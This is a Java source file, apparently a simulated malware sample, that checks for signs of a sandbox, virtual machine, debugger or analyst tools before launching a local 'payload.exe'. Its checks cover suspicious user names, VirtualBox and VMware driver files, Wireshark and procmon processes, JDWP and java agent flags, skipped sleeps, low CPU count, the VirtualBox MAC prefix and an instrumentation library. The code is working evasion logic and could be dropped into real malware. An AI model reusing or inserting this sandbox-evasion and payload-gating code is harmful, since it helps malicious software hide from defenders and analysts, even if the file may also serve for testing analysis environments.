package dev.javabyte.guest.sim;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * Simulated environment checks: the sample looks for signs of a sandbox, a debugger or an
 * analyst's tools and only releases its "payload" if it finds none.
 */
public final class AntiAnalysis {

    public static void main(String[] args) throws Exception {
        List<String> reasons = detect();
        if (!reasons.isEmpty()) {
            System.out.println("analysis environment: " + String.join(",", reasons));
            System.exit(1);
        }
        System.out.println("environment looks real");
        Runtime.getRuntime().exec("C:\\Users\\Public\\payload.exe --go");
    }

    static List<String> detect() throws Exception {
        List<String> reasons = new ArrayList<>();
        String user = System.getProperty("user.name").toLowerCase();
        if (List.of("sandbox", "malware", "virus", "analyst", "cuckoo").contains(user)) {
            reasons.add("user");
        }
        for (String artefact : new String[] {"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
                "C:\\Windows\\System32\\drivers\\vmhgfs.sys", "C:\\Program Files\\Wireshark\\Wireshark.exe"}) {
            if (new File(artefact).exists()) {
                reasons.add("file");
                break;
            }
        }
        Process tasks = Runtime.getRuntime().exec("tasklist /fo csv /nh");
        BufferedReader reader = new BufferedReader(new InputStreamReader(tasks.getInputStream()));
        for (String line = reader.readLine(); line != null; line = reader.readLine()) {
            String lower = line.toLowerCase();
            if (lower.contains("wireshark") || lower.contains("procmon") || lower.contains("vboxservice")) {
                reasons.add("process");
                break;
            }
        }
        for (String argument : ManagementFactory.getRuntimeMXBean().getInputArguments()) {
            if (argument.contains("jdwp") || argument.startsWith("-javaagent")) {
                reasons.add("debugger");
            }
        }
        // Sandboxes often skip sleeps; a real minute must really pass.
        long before = System.currentTimeMillis();
        Thread.sleep(60_000);
        if (System.currentTimeMillis() - before < 59_000) {
            reasons.add("sleep-skipped");
        }
        if (Runtime.getRuntime().availableProcessors() < 2) {
            reasons.add("cpu");
        }
        for (NetworkInterface nic : Collections.list(NetworkInterface.getNetworkInterfaces())) {
            byte[] mac = nic.getHardwareAddress();
            // 08:00:27 is the VirtualBox vendor prefix.
            if (mac != null && mac.length >= 3 && mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27) {
                reasons.add("mac");
            }
        }
        try {
            Class.forName("org.objectweb.asm.ClassReader");
            reasons.add("instrumentation-library");
        } catch (ClassNotFoundException expected) {
            // not being instrumented
        }
        return reasons;
    }
}
